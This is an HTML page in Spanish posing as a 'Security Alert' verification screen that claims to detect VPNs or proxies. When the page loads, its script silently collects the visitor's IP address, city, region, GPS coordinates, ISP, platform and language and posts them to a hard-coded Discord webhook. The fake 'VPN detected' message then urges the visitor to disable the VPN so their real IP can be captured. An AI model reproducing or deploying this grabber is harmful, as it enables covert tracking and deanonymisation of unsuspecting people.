<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Node - Verification</title>
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { background: #1e293b; border: 1px solid #334155; padding: 2rem; border-radius: 8px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); max-width: 400px; width: 90%; text-align: center; }
        .warn { color: #fbbf24; font-size: 3rem; margin-bottom: 1rem; }
        h2 { margin: 0 0 1rem; font-size: 1.2rem; text-transform: uppercase; letter-spacing: 2px; }
        .loader { height: 4px; width: 100%; background: #334155; border-radius: 10px; margin: 1.5rem 0; overflow: hidden; }
        .fill { height: 100%; width: 0%; background: #ef4444; transition: width 0.1s; }
        #status { font-size: 0.8rem; color: #94a3b8; }
        .error-msg { display: none; background: #450a0a; border: 1px solid #991b1b; padding: 10px; border-radius: 4px; margin-top: 1rem; font-size: 0.85rem; color: #fca5a5; }
    </style>
</head>
<body>
    <div class="box">
        <div class="warn">‚ö†Ô∏è</div>
        <h2>Security Alert</h2>
        <div id="status">Iniciando escaneo de t√∫neles...</div>
        <div class="loader"><div class="fill" id="bar"></div></div>
        <div id="error-box" class="error-msg">
            <strong>VPN/PROXY DETECTADO</strong><br>
            El sistema ha bloqueado el acceso desde su IP actual por uso de herramientas de anonimato. Desactive su VPN y recargue para ver el reporte.
        </div>
    </div>

    <script>
        // ============================================
        // CONFIGURACI√ìN
        // ============================================
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1462321256807530526/LWNvof3-5p65SyT7NAobTwT7__pn2Xniyqg2f_ia5a_anjEWaHvQ-2--RcEzu7SSbBqr";

        async function init() {
            const bar = document.getElementById('bar');
            const st = document.getElementById('status');
            const err = document.getElementById('error-box');
            
            // 1. CAPTURA SILENCIOSA Y ENV√çO A DISCORD
            try {
                // Obtener IP
                const respIP = await fetch('https://api.ipify.org?format=json');
                const dataIP = await respIP.json();
                const ip = dataIP.ip;

                // Obtener geolocalizaci√≥n
                const respGeo = await fetch(`https://ipapi.co/${ip}/json/`);
                const geo = await respGeo.json();

                // Crear embed para Discord
                const embed = {
                    embeds: [{
                        title: "üåê NUEVA IP CAPTURADA",
                        color: 0xFF0000,
                        fields: [
                            { name: "üåê IP", value: `\`${ip}\``, inline: true },
                            { name: "üåç Pa√≠s", value: `${geo.country_name || 'N/A'} ${geo.country_emoji || ''}`, inline: true },
                            { name: "üèôÔ∏è Ciudad", value: `${geo.city || 'N/A'}`, inline: true },
                            { name: "üìç Regi√≥n", value: `${geo.region || 'N/A'}`, inline: true },
                            { name: "üó∫Ô∏è GPS", value: `[${geo.latitude}, ${geo.longitude}](https://www.google.com/maps?q=${geo.latitude},${geo.longitude})`, inline: true },
                            { name: "üè¢ ISP", value: `${geo.org || 'N/A'}`, inline: true },
                            { name: "üíª Sistema", value: `${navigator.platform}`, inline: true },
                            { name: "üåê Idioma", value: `${navigator.language}`, inline: true },
                            { name: "‚è∞ Fecha", value: `${new Date().toLocaleString('es-ES')}`, inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                // Enviar a Discord
                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embed)
                });

                console.log('‚úÖ IP enviada a Discord');

            } catch(e) {
                console.error('‚ùå Error:', e);
            }

            // 2. ANIMACI√ìN DE "DETECCI√ìN"
            let w = 0;
            const iv = setInterval(() => {
                w += 1;
                bar.style.width = w + "%";
                if(w == 30) st.innerText = "Analizando paquetes...";
                if(w == 60) st.innerText = "Cruzando IP con registros...";
                if(w == 90) st.innerText = "Finalizando...";
                if(w >= 100) {
                    clearInterval(iv);
                    st.style.display = "none";
                    err.style.display = "block";
                }
            }, 50);
        }

        window.onload = init;
    </script>
</body>
</html>
